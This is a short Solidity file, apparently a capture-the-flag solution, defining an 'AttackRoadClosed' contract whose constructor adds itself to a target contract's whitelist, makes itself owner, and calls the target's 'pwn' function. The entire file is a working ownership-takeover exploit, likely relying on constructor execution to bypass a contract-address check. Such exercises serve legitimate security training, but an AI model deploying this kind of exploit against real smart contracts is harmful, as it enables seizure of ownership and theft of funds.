// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;
// import "../RoadClosed/RoadClosed.sol"

interface IRoadClosed{
    function addToWhitelist(address addr) external ;
    function changeOwner(address addr) external;
    function pwn(address addr) external payable;
}


contract AttackRoadClosed {

    constructor(IRoadClosed RoadClosed){
        RoadClosed.addToWhitelist(address(this));
        RoadClosed.changeOwner(address(this));
        RoadClosed.pwn(address(this));        
    }
}

    

